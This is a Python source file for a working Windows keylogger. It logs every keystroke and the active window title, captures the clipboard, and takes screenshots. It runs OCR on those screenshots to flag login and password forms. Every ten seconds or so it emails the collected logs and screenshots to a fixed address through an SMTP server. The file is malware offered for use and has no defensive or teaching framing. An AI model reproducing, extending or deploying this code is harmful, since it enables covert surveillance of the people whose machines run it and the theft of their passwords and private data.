import os
import time
import glob
import getpass
import smtplib
import email.utils
from email.mime.multipart import MIMEMultipart
from email.mime.text import MIMEText
from email.mime.base import MIMEBase
from email import encoders
from threading import Timer
from pynput.keyboard import Listener
import pyautogui
import pytesseract
from PIL import Image
import pyperclip
import win32gui
import shutil
from pynput.keyboard import Key

mail_to = "mail@mail.com"
user = getpass.getuser()
tesseract_path = rf'C:\Users\{user}\AppData\Local\Programs\Tesseract-OCR\tesseract.exe'

class Keylogger:
    def __init__(self, mail_from, mail_to, freq):
        self.mail_from = mail_from
        self.mail_to = mail_to
        self.freq = freq
        self.keys_excluded = {Key.ctrl_l, Key.ctrl_r, Key.shift_l, Key.shift_r, Key.alt_l, Key.alt_r, 
                              Key.caps_lock, Key.num_lock, Key.cmd, Key.up, Key.down, Key.left, Key.right}
        pytesseract.pytesseract.tesseract_cmd = tesseract_path
        self.table = []
        self.log = []
        self.cboard = ''
        self.text = ''
        self.screens = []
        self.active_window_log = []

    def get_active_window_title(self):
        return win32gui.GetWindowText(win32gui.GetForegroundWindow())

    def send_email(self, data, screens, if_cboard):
        timestamp = time.strftime("%d.%m.%Y | %H:%M:%S", time.localtime())
        subject = f"{timestamp} data"
        body = "RECENT | TOTAL\n"
        body += f"{data['r_keystrokes']} | {data['t_keystrokes']}  keystrokes\n"
        body += f"{data['r_words']} | {data['t_words']}    words\n"
        body += f"| {data['t_screens']}    screenshots\n"

        msg = MIMEMultipart()
        msg['From'] = self.mail_from
        msg['To'] = self.mail_to
        msg['Subject'] = subject
        msg['Message-ID'] = email.utils.make_msgid()
        msg.attach(MIMEText(body, 'plain'))
        log_files = ["r_log.txt", "r_cboard.txt", "r_text.txt"]
        for log_file in log_files:
            if log_file == "r_cboard.txt" and not if_cboard:
                pass
            else:
                with open(log_file, "rb") as lf:
                    attachment = MIMEBase('application', 'octet-stream')
                    attachment.set_payload(lf.read())
                    encoders.encode_base64(attachment)
                    attachment.add_header('Content-Disposition', 'attachment', filename=os.path.basename(log_file))
                    msg.attach(attachment)

        screens_files = glob.glob('screenshots/*.png')
        new = [s.replace('screenshots/', '') for s in screens_files if s not in screens]
        for screens_file in new:
            with open(screens_file, "rb") as fs:
                attachment = MIMEBase('application', 'octet-stream')
                attachment.set_payload(fs.read())
                encoders.encode_base64(attachment)
                attachment.add_header('Content-Disposition', 'attachment', filename=os.path.basename(screens_file))
                msg.attach(attachment)
            for screen in new:
                screens.append(screen)

        try:
            server = smtplib.SMTP('aspmx.l.google.com')
            server.send_message(msg)
            server.quit()
            print("Email sent successfully")
        except Exception as e:
            print(f"Failed to send email: {e}")

    def detect_login(self, name):
        image = Image.open(name)
        try:
            text = pytesseract.image_to_string(image)
            keywords = ["password", "email", "login", "username"]
            if any(keyword in text.lower() for keyword in keywords):
                return True
        except pytesseract.TesseractError as e:
            print(f'\nError processing {name}: {e}\n')
        return False

    def capture_screen(self):
        timestamp = int(time.time())
        try:
            name = f'screenshots/{timestamp}.png'
            screens = pyautogui.screenshot()
            screens.save(name)
            if self.detect_login(name):
                print(f'Potential login form detected in {name}')
            return name
        except pyperclip.PyperclipException as e:
            print(f'\nError while taking screenshot: {e}\n')
            return None

    def get_cboard(self):
        try:
            return pyperclip.paste()
        except pyperclip.PyperclipException as e:
            return f'\nError accessing clipboard: {e}\n'

    def tracking_job(self):
        with open("r_log.txt", 'w', encoding='utf-8') as rfl:
            if_cboard = False
            if_text = False
            active_window = self.get_active_window_title()
            if self.log == [] or self.log[-1] != str(active_window):
                self.log += [f"\t{active_window}\t"]
            for c in self.table:
                if c is not None:
                    self.log += [str(c)]
                    if c == Key.enter:
                        self.text += '\n'
                    elif c == Key.space:
                        self.text += ' '
                    elif c == Key.tab:
                        self.text += '\t'
                    elif isinstance(c, str) and c.isprintable() and c not in self.keys_excluded:
                        self.text += str(c)
                        if_text = True
                    cboard_new = str(self.get_cboard())
                    if cboard_new != self.cboard:
                        if_cboard = True
                        self.cboard = cboard_new

        with open("r_log.txt", 'a', encoding='utf-8') as rfl, open("log.txt", 'a', encoding='utf-8') as fl:
            rfl.write(' '.join(self.log))
            fl.write(' '.join(self.log))
        if if_cboard:
            with open("r_cboard.txt", 'w', encoding='utf-8') as rfc, open("cboard.txt", 'a', encoding='utf-8') as fc:
                rfc.write(f'{self.cboard}')
                fc.write(f'\n\t{self.cboard}\t\n')
        with open("r_text.txt", 'w', encoding='utf-8') as rft, open("text.txt", 'a', encoding='utf-8') as ft:
            rft.write(self.text)
            ft.write(self.text)
        with open("log.txt", "r", encoding='utf-8') as fl:
            log_data = fl.read()
        with open("text.txt", "r", encoding='utf-8') as ft:
            text_data = ft.read()

        data = {
            't_keystrokes': len(log_data.split()),
            't_words': len(text_data.split()),
            't_screens': len(glob.glob('screenshots/*.png')),
            'r_keystrokes': len(self.log),
            'r_words': len(self.text.split()),
        }

        if any((if_text, if_cboard)):
            name = self.capture_screen()
            if name:
                with open("r_log.txt", 'a', encoding='utf-8') as rfl, open("log.txt", 'a', encoding='utf-8') as fl:
                    to_write = f'\n\t{str(name)} at {time.strftime("%d.%m.%Y | %H:%M:%S", time.localtime())}\t\n'
                    rfl.write(to_write)
                    fl.write(to_write)
                    if self.detect_login(name):
                        to_write = f'\n\tPotential login form detected in {name} at {time.strftime("%d.%m.%Y | %H:%M:%S", time.localtime())}\t\n'
                        rfl.write(to_write)
                        fl.write(to_write)
                self.send_email(data, self.screens, if_cboard)

        self.table.clear()
        self.log.clear()
        self.text = ""
        Timer(self.freq, self.tracking_job).start()

    def on_press(self, key):
        print(key)
        try:
            if key.char == '\b' and self.table:
                self.table.pop()
            else:
                self.table.append(key.char)
        except AttributeError:
            if key == key.backspace and self.table:
                self.table.pop()
            else:
                self.table.append(key)
        self.active_window_log.append(self.get_active_window_title())

    def start(self):
        path = os.getcwd()
        s_path = os.path.join(path, 'screenshots')
        if os.path.exists(s_path):
            shutil.rmtree(s_path)
        os.makedirs(s_path)
        with open("log.txt", 'w', encoding='utf-8') as fl:
            fl.write("")
        with open("cboard.txt", 'w', encoding='utf-8') as fc:
            fc.write("")
        with open("text.txt", 'w', encoding='utf-8') as ft:
            ft.write("")
        with open("r_log.txt", 'w', encoding='utf-8') as rfl:
            rfl.write("")
        with open("r_cboard.txt", 'w', encoding='utf-8') as rfc:
            rfc.write("")
        with open("r_text.txt", 'w', encoding='utf-8') as rft:
            rft.write("")

        try:
            with Listener(on_press=self.on_press) as listener:
                Timer(self.freq, self.tracking_job).start()
                listener.join()
            self.tracking_job()
        except Exception as e:
            print(f"An error occurred: {e}")

if __name__ == "__main__":
    keylogger = Keylogger(mail_from="yourskeylogger@gmail.com", mail_to=mail_to, freq=10)
    keylogger.start()
